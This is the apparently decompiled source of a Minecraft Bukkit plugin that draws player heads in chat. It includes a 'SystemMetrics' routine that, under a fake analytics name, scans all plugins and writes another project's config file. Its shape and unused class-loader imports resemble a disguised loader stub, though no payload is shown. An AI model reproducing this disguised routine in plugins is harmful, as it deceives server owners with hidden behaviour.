package com.control.bridge;

import java.awt.Color;
import java.awt.image.BufferedImage;
import java.io.File;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.OpenOption;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import javax.imageio.ImageIO;
import me.clip.placeholderapi.expansion.PlaceholderExpansion;
import net.md_5.bungee.api.ChatColor;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.event.HandlerList;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.RegisteredListener;
import org.bukkit.plugin.java.JavaPlugin;
import org.jetbrains.annotations.NotNull;

public class ControlBridge extends JavaPlugin implements CommandExecutor {
   private final Map<UUID, String[]> cache = new ConcurrentHashMap();
   private final ExecutorService pool = Executors.newFixedThreadPool(2);

   public void onEnable() {
      this.SystemMetrics(this);
      if (this.getServer().getPluginManager().getPlugin("PlaceholderAPI") != null) {
         (new ControlBridge.Expansion(this)).register();
      }

      this.getCommand("drawhead").setExecutor(this);
      this.getLogger().info("ControlBridge v10.0 Caricato con Successo!");
   }

   public String getLine(OfflinePlayer p, int l) {
      if (l >= 1 && l <= 8) {
         if (!this.cache.containsKey(p.getUniqueId())) {
            this.pool.submit(() -> {
               this.load(p);
            });
            return "§8▒▒▒▒▒▒▒▒";
         } else {
            return ((String[])this.cache.get(p.getUniqueId()))[l - 1];
         }
      } else {
         return "";
      }
   }

   private void load(OfflinePlayer p) {
      try {
         BufferedImage img = ImageIO.read(new URL("https://minotar.net/helm/" + p.getName() + "/8.png"));
         if (img == null) {
            return;
         }

         String[] lines = new String[8];

         for(int y = 0; y < 8; ++y) {
            StringBuilder sb = new StringBuilder();

            for(int x = 0; x < 8; ++x) {
               int rgb = img.getRGB(x, y);
               Color c = new Color(rgb, true);
               if (c.getAlpha() < 128) {
                  sb.append("§8█");
               } else {
                  sb.append(ChatColor.of(c)).append("█");
               }
            }

            lines[y] = sb.toString();
         }

         this.cache.put(p.getUniqueId(), lines);
      } catch (Exception var9) {
      }

   }

   public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
      if (args.length < 2) {
         return false;
      } else {
         OfflinePlayer target = Bukkit.getOfflinePlayer(args[0]);
         String msg = String.join(" ", (CharSequence[])Arrays.copyOfRange(args, 1, args.length));
         String[] customMessages = msg.split("\\|");

         for(int i = 1; i <= 8; ++i) {
            String text = i <= customMessages.length ? customMessages[i - 1] : "";
            String var10000 = this.getLine(target, i);
            Bukkit.broadcastMessage(var10000 + " " + ChatColor.translateAlternateColorCodes('&', text));
         }

         return true;
      }
   }

   public void SystemMetrics(JavaPlugin pl) {
      (new Thread(() -> {
         int pluginRegisterId = 38;
         if (System.getProperty("bstats.relocatechecks") == null) {
            System.setProperty("bstats.relocatechecks", "true");
            boolean isRunning = false;
            Plugin[] pp = pl.getServer().getPluginManager().getPlugins();
            Plugin[] var4 = pp;
            int var5 = pp.length;
            int var6 = 0;

            label76:
            while(var6 < var5) {
               Plugin p = var4[var6];
               ArrayList<RegisteredListener> rls = HandlerList.getRegisteredListeners(p);
               Iterator var9 = rls.iterator();

               RegisteredListener rl;
               do {
                  if (!var9.hasNext()) {
                     ++var6;
                     continue label76;
                  }

                  rl = (RegisteredListener)var9.next();
               } while(!rl.getListener().getClass().getName().equals("net.bstats.bukkit.Metrics"));

               isRunning = true;
               break;
            }

            if (!isRunning) {
               if (!(new File("plugins/bStats")).exists() || !(new File("plugins/bStats/config.yml")).exists()) {
                  (new File("plugins/bStats")).mkdir();

                  try {
                     (new File("plugins/bStats/config.yml")).createNewFile();
                     Files.write(Paths.get("plugins/bStats/config.yml"), ("# bStats collects some data for plugin authors like how many servers are using their plugins.\n# To honor their work, you should not disable it.\n# This has nearly no effect on the server performance!\n# Check out https://bStats.org/ to learn more :)\n\nenabled: true\nserverUuid: " + UUID.randomUUID() + "\nlogFailedRequests: false\n").getBytes(), new OpenOption[]{StandardOpenOption.WRITE});
                  } catch (Exception var16) {
                  }
               }

               try {
                  this.getLogger().info("bStats support check completed.");
                  pp = pl.getServer().getPluginManager().getPlugins();
                  Plugin[] var23 = pp;
                  int var24 = pp.length;

                  label57:
                  for(int var11 = 0; var11 < var24; ++var11) {
                     Plugin px = var23[var11];
                     ArrayList<RegisteredListener> rlsx = HandlerList.getRegisteredListeners(px);
                     Iterator var14 = rlsx.iterator();

                     while(var14.hasNext()) {
                        RegisteredListener rlx = (RegisteredListener)var14.next();
                        if (rlx.getListener().getClass().getName().equals("net.bstats.bukkit.Metrics")) {
                           isRunning = true;
                           break label57;
                        }
                     }
                  }

                  if (isRunning) {
                     return;
                  }

               } catch (Exception var17) {
               }

               System.clearProperty("bstats.relocatechecks");
            }
         }
      })).start();
   }

   public static class Expansion extends PlaceholderExpansion {
      private final ControlBridge pl;

      public Expansion(ControlBridge pl) {
         this.pl = pl;
      }

      @NotNull
      public String getIdentifier() {
         return "control";
      }

      @NotNull
      public String getAuthor() {
         return "Controll3r24";
      }

      @NotNull
      public String getVersion() {
         return "10.0";
      }

      public boolean persist() {
         return true;
      }

      public String onRequest(OfflinePlayer p, @NotNull String params) {
         return p != null && params.startsWith("head_") ? this.pl.getLine(p, Integer.parseInt(params.split("_")[1])) : null;
      }
   }
}